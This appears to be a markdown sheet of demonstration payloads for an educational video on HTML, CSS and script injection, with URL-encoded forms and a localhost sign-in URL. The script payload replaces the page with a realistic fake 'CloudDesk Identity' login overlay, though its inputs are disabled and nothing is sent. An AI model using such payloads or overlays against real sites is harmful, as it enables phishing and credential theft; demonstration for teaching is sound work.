# Safe local demo payloads

These are non-exfiltrating payloads for recording an educational video.

## Simple HTML

```html
<strong style="color:#b42318">Injected HTML proof: this message was rendered as markup.</strong>
```

Encoded:

```text
%3Cstrong%20style%3D%22color%3A%23b42318%22%3EInjected%20HTML%20proof%3A%20this%20message%20was%20rendered%20as%20markup.%3C%2Fstrong%3E
```

## Banner

```html
<div style="padding:14px;border-radius:12px;background:#fff7ed;border:1px solid #fed7aa;color:#9a3412"><strong>Workspace notice</strong><br>Some sign-in methods are temporarily unavailable. This banner was injected from the URL.</div>
```

Encoded:

```text
%3Cdiv%20style%3D%22padding%3A14px%3Bborder-radius%3A12px%3Bbackground%3A%23fff7ed%3Bborder%3A1px%20solid%20%23fed7aa%3Bcolor%3A%239a3412%22%3E%3Cstrong%3EWorkspace%20notice%3C%2Fstrong%3E%3Cbr%3ESome%20sign-in%20methods%20are%20temporarily%20unavailable.%20This%20banner%20was%20injected%20from%20the%20URL.%3C%2Fdiv%3E
```

## CSS injection

```html
<style>.auth-card{transform:rotate(-1deg)} .auth-card:before{content:"Injected CSS";display:block;margin-bottom:12px;padding:10px;border-radius:10px;background:#fee2e2;color:#991b1b;font-weight:800}</style>
```

Encoded:

```text
%3Cstyle%3E.auth-card%7Btransform%3Arotate%28-1deg%29%7D%20.auth-card%3Abefore%7Bcontent%3A%22Injected%20CSS%22%3Bdisplay%3Ablock%3Bmargin-bottom%3A12px%3Bpadding%3A10px%3Bborder-radius%3A10px%3Bbackground%3A%23fee2e2%3Bcolor%3A%23991b1b%3Bfont-weight%3A800%7D%3C%2Fstyle%3E
```

## Script page replacement

```html
<script>
document.body.innerHTML = `
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,"Segoe UI",Roboto,Arial,sans-serif}
body{background:#f4f7fb;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#172033}
.card{width:430px;background:#fff;border:1px solid #dde5f2;border-radius:20px;box-shadow:0 24px 80px rgba(29,45,78,.14);padding:34px}
.logo{display:flex;align-items:center;gap:12px;margin-bottom:26px}
.mark{width:38px;height:38px;border-radius:12px;background:linear-gradient(135deg,#2563eb,#14b8a6);display:grid;place-items:center;color:white;font-weight:900}
.logo span{font-size:20px;font-weight:750;color:#111827}
.notice{background:#fff7ed;border:1px solid #fed7aa;color:#9a3412;border-radius:14px;padding:12px 14px;margin:0 0 20px;font-size:14px;line-height:1.5}
h1{font-size:25px;letter-spacing:-.03em;margin-bottom:8px;color:#111827}
p{color:#667085;line-height:1.6;margin-bottom:22px;font-size:14px}
label{display:block;color:#1f2937;font-weight:650;font-size:13px;margin-bottom:7px}
input{width:100%;height:46px;border:1px solid #cbd5e1;border-radius:12px;padding:0 13px;font-size:15px;outline:none;margin-bottom:14px;background:#fff}
input:focus{border-color:#2563eb;box-shadow:0 0 0 4px rgba(37,99,235,.12)}
button{width:100%;height:46px;border:0;border-radius:12px;background:#2563eb;color:white;font-size:15px;font-weight:750;cursor:pointer}
button:hover{background:#1d4ed8}
.row{display:flex;justify-content:space-between;gap:16px;margin-top:18px;font-size:13px}
a{color:#2563eb;text-decoration:none}
.small{margin-top:24px;text-align:center;font-size:12px;color:#98a2b3}
</style>
<div class="card">
  <div class="logo"><div class="mark">C</div><span>CloudDesk Identity</span></div>
  <div class="notice"><strong>Session verification required.</strong><br>This demo overlay was injected through the login message parameter.</div>
  <h1>Confirm workspace access</h1>
  <p>This is a harmless local proof-of-impact page replacement. No credentials are collected or transmitted.</p>
  <label>Workspace email</label>
  <input value="user@example.local" disabled>
  <label>Verification code</label>
  <input placeholder="000000" disabled>
  <button id="demoBtn">Continue</button>
  <div class="row"><a href="#">Help</a><a href="#">Use another method</a></div>
  <div class="small">Local training demo only</div>
</div>`;
document.getElementById("demoBtn").addEventListener("click", function () {
  alert("Demo only: no data captured, no network request sent.");
});
</script>
```

Encoded:

```text
%3Cscript%3E%0Adocument.body.innerHTML%20%3D%20%60%0A%3Cstyle%3E%0A%2A%7Bmargin%3A0%3Bpadding%3A0%3Bbox-sizing%3Aborder-box%3Bfont-family%3AInter%2C%22Segoe%20UI%22%2CRoboto%2CArial%2Csans-serif%7D%0Abody%7Bbackground%3A%23f4f7fb%3Bmin-height%3A100vh%3Bdisplay%3Aflex%3Balign-items%3Acenter%3Bjustify-content%3Acenter%3Bcolor%3A%23172033%7D%0A.card%7Bwidth%3A430px%3Bbackground%3A%23fff%3Bborder%3A1px%20solid%20%23dde5f2%3Bborder-radius%3A20px%3Bbox-shadow%3A0%2024px%2080px%20rgba%2829%2C45%2C78%2C.14%29%3Bpadding%3A34px%7D%0A.logo%7Bdisplay%3Aflex%3Balign-items%3Acenter%3Bgap%3A12px%3Bmargin-bottom%3A26px%7D%0A.mark%7Bwidth%3A38px%3Bheight%3A38px%3Bborder-radius%3A12px%3Bbackground%3Alinear-gradient%28135deg%2C%232563eb%2C%2314b8a6%29%3Bdisplay%3Agrid%3Bplace-items%3Acenter%3Bcolor%3Awhite%3Bfont-weight%3A900%7D%0A.logo%20span%7Bfont-size%3A20px%3Bfont-weight%3A750%3Bcolor%3A%23111827%7D%0A.notice%7Bbackground%3A%23fff7ed%3Bborder%3A1px%20solid%20%23fed7aa%3Bcolor%3A%239a3412%3Bborder-radius%3A14px%3Bpadding%3A12px%2014px%3Bmargin%3A0%200%2020px%3Bfont-size%3A14px%3Bline-height%3A1.5%7D%0Ah1%7Bfont-size%3A25px%3Bletter-spacing%3A-.03em%3Bmargin-bottom%3A8px%3Bcolor%3A%23111827%7D%0Ap%7Bcolor%3A%23667085%3Bline-height%3A1.6%3Bmargin-bottom%3A22px%3Bfont-size%3A14px%7D%0Alabel%7Bdisplay%3Ablock%3Bcolor%3A%231f2937%3Bfont-weight%3A650%3Bfont-size%3A13px%3Bmargin-bottom%3A7px%7D%0Ainput%7Bwidth%3A100%25%3Bheight%3A46px%3Bborder%3A1px%20solid%20%23cbd5e1%3Bborder-radius%3A12px%3Bpadding%3A0%2013px%3Bfont-size%3A15px%3Boutline%3Anone%3Bmargin-bottom%3A14px%3Bbackground%3A%23fff%7D%0Ainput%3Afocus%7Bborder-color%3A%232563eb%3Bbox-shadow%3A0%200%200%204px%20rgba%2837%2C99%2C235%2C.12%29%7D%0Abutton%7Bwidth%3A100%25%3Bheight%3A46px%3Bborder%3A0%3Bborder-radius%3A12px%3Bbackground%3A%232563eb%3Bcolor%3Awhite%3Bfont-size%3A15px%3Bfont-weight%3A750%3Bcursor%3Apointer%7D%0Abutton%3Ahover%7Bbackground%3A%231d4ed8%7D%0A.row%7Bdisplay%3Aflex%3Bjustify-content%3Aspace-between%3Bgap%3A16px%3Bmargin-top%3A18px%3Bfont-size%3A13px%7D%0Aa%7Bcolor%3A%232563eb%3Btext-decoration%3Anone%7D%0A.small%7Bmargin-top%3A24px%3Btext-align%3Acenter%3Bfont-size%3A12px%3Bcolor%3A%2398a2b3%7D%0A%3C%2Fstyle%3E%0A%3Cdiv%20class%3D%22card%22%3E%0A%20%20%3Cdiv%20class%3D%22logo%22%3E%3Cdiv%20class%3D%22mark%22%3EC%3C%2Fdiv%3E%3Cspan%3ECloudDesk%20Identity%3C%2Fspan%3E%3C%2Fdiv%3E%0A%20%20%3Cdiv%20class%3D%22notice%22%3E%3Cstrong%3ESession%20verification%20required.%3C%2Fstrong%3E%3Cbr%3EThis%20demo%20overlay%20was%20injected%20through%20the%20login%20message%20parameter.%3C%2Fdiv%3E%0A%20%20%3Ch1%3EConfirm%20workspace%20access%3C%2Fh1%3E%0A%20%20%3Cp%3EThis%20is%20a%20harmless%20local%20proof-of-impact%20page%20replacement.%20No%20credentials%20are%20collected%20or%20transmitted.%3C%2Fp%3E%0A%20%20%3Clabel%3EWorkspace%20email%3C%2Flabel%3E%0A%20%20%3Cinput%20value%3D%22user%40example.local%22%20disabled%3E%0A%20%20%3Clabel%3EVerification%20code%3C%2Flabel%3E%0A%20%20%3Cinput%20placeholder%3D%22000000%22%20disabled%3E%0A%20%20%3Cbutton%20id%3D%22demoBtn%22%3EContinue%3C%2Fbutton%3E%0A%20%20%3Cdiv%20class%3D%22row%22%3E%3Ca%20href%3D%22%23%22%3EHelp%3C%2Fa%3E%3Ca%20href%3D%22%23%22%3EUse%20another%20method%3C%2Fa%3E%3C%2Fdiv%3E%0A%20%20%3Cdiv%20class%3D%22small%22%3ELocal%20training%20demo%20only%3C%2Fdiv%3E%0A%3C%2Fdiv%3E%60%3B%0Adocument.getElementById%28%22demoBtn%22%29.addEventListener%28%22click%22%2C%20function%20%28%29%20%7B%0A%20%20alert%28%22Demo%20only%3A%20no%20data%20captured%2C%20no%20network%20request%20sent.%22%29%3B%0A%7D%29%3B%0A%3C%2Fscript%3E
```

Full URL:

```text
http://localhost:3000/signin?error=%3Cscript%3E%0Adocument.body.innerHTML%20%3D%20%60%0A%3Cstyle%3E%0A%2A%7Bmargin%3A0%3Bpadding%3A0%3Bbox-sizing%3Aborder-box%3Bfont-family%3AInter%2C%22Segoe%20UI%22%2CRoboto%2CArial%2Csans-serif%7D%0Abody%7Bbackground%3A%23f4f7fb%3Bmin-height%3A100vh%3Bdisplay%3Aflex%3Balign-items%3Acenter%3Bjustify-content%3Acenter%3Bcolor%3A%23172033%7D%0A.card%7Bwidth%3A430px%3Bbackground%3A%23fff%3Bborder%3A1px%20solid%20%23dde5f2%3Bborder-radius%3A20px%3Bbox-shadow%3A0%2024px%2080px%20rgba%2829%2C45%2C78%2C.14%29%3Bpadding%3A34px%7D%0A.logo%7Bdisplay%3Aflex%3Balign-items%3Acenter%3Bgap%3A12px%3Bmargin-bottom%3A26px%7D%0A.mark%7Bwidth%3A38px%3Bheight%3A38px%3Bborder-radius%3A12px%3Bbackground%3Alinear-gradient%28135deg%2C%232563eb%2C%2314b8a6%29%3Bdisplay%3Agrid%3Bplace-items%3Acenter%3Bcolor%3Awhite%3Bfont-weight%3A900%7D%0A.logo%20span%7Bfont-size%3A20px%3Bfont-weight%3A750%3Bcolor%3A%23111827%7D%0A.notice%7Bbackground%3A%23fff7ed%3Bborder%3A1px%20solid%20%23fed7aa%3Bcolor%3A%239a3412%3Bborder-radius%3A14px%3Bpadding%3A12px%2014px%3Bmargin%3A0%200%2020px%3Bfont-size%3A14px%3Bline-height%3A1.5%7D%0Ah1%7Bfont-size%3A25px%3Bletter-spacing%3A-.03em%3Bmargin-bottom%3A8px%3Bcolor%3A%23111827%7D%0Ap%7Bcolor%3A%23667085%3Bline-height%3A1.6%3Bmargin-bottom%3A22px%3Bfont-size%3A14px%7D%0Alabel%7Bdisplay%3Ablock%3Bcolor%3A%231f2937%3Bfont-weight%3A650%3Bfont-size%3A13px%3Bmargin-bottom%3A7px%7D%0Ainput%7Bwidth%3A100%25%3Bheight%3A46px%3Bborder%3A1px%20solid%20%23cbd5e1%3Bborder-radius%3A12px%3Bpadding%3A0%2013px%3Bfont-size%3A15px%3Boutline%3Anone%3Bmargin-bottom%3A14px%3Bbackground%3A%23fff%7D%0Ainput%3Afocus%7Bborder-color%3A%232563eb%3Bbox-shadow%3A0%200%200%204px%20rgba%2837%2C99%2C235%2C.12%29%7D%0Abutton%7Bwidth%3A100%25%3Bheight%3A46px%3Bborder%3A0%3Bborder-radius%3A12px%3Bbackground%3A%232563eb%3Bcolor%3Awhite%3Bfont-size%3A15px%3Bfont-weight%3A750%3Bcursor%3Apointer%7D%0Abutton%3Ahover%7Bbackground%3A%231d4ed8%7D%0A.row%7Bdisplay%3Aflex%3Bjustify-content%3Aspace-between%3Bgap%3A16px%3Bmargin-top%3A18px%3Bfont-size%3A13px%7D%0Aa%7Bcolor%3A%232563eb%3Btext-decoration%3Anone%7D%0A.small%7Bmargin-top%3A24px%3Btext-align%3Acenter%3Bfont-size%3A12px%3Bcolor%3A%2398a2b3%7D%0A%3C%2Fstyle%3E%0A%3Cdiv%20class%3D%22card%22%3E%0A%20%20%3Cdiv%20class%3D%22logo%22%3E%3Cdiv%20class%3D%22mark%22%3EC%3C%2Fdiv%3E%3Cspan%3ECloudDesk%20Identity%3C%2Fspan%3E%3C%2Fdiv%3E%0A%20%20%3Cdiv%20class%3D%22notice%22%3E%3Cstrong%3ESession%20verification%20required.%3C%2Fstrong%3E%3Cbr%3EThis%20demo%20overlay%20was%20injected%20through%20the%20login%20message%20parameter.%3C%2Fdiv%3E%0A%20%20%3Ch1%3EConfirm%20workspace%20access%3C%2Fh1%3E%0A%20%20%3Cp%3EThis%20is%20a%20harmless%20local%20proof-of-impact%20page%20replacement.%20No%20credentials%20are%20collected%20or%20transmitted.%3C%2Fp%3E%0A%20%20%3Clabel%3EWorkspace%20email%3C%2Flabel%3E%0A%20%20%3Cinput%20value%3D%22user%40example.local%22%20disabled%3E%0A%20%20%3Clabel%3EVerification%20code%3C%2Flabel%3E%0A%20%20%3Cinput%20placeholder%3D%22000000%22%20disabled%3E%0A%20%20%3Cbutton%20id%3D%22demoBtn%22%3EContinue%3C%2Fbutton%3E%0A%20%20%3Cdiv%20class%3D%22row%22%3E%3Ca%20href%3D%22%23%22%3EHelp%3C%2Fa%3E%3Ca%20href%3D%22%23%22%3EUse%20another%20method%3C%2Fa%3E%3C%2Fdiv%3E%0A%20%20%3Cdiv%20class%3D%22small%22%3ELocal%20training%20demo%20only%3C%2Fdiv%3E%0A%3C%2Fdiv%3E%60%3B%0Adocument.getElementById%28%22demoBtn%22%29.addEventListener%28%22click%22%2C%20function%20%28%29%20%7B%0A%20%20alert%28%22Demo%20only%3A%20no%20data%20captured%2C%20no%20network%20request%20sent.%22%29%3B%0A%7D%29%3B%0A%3C%2Fscript%3E
```
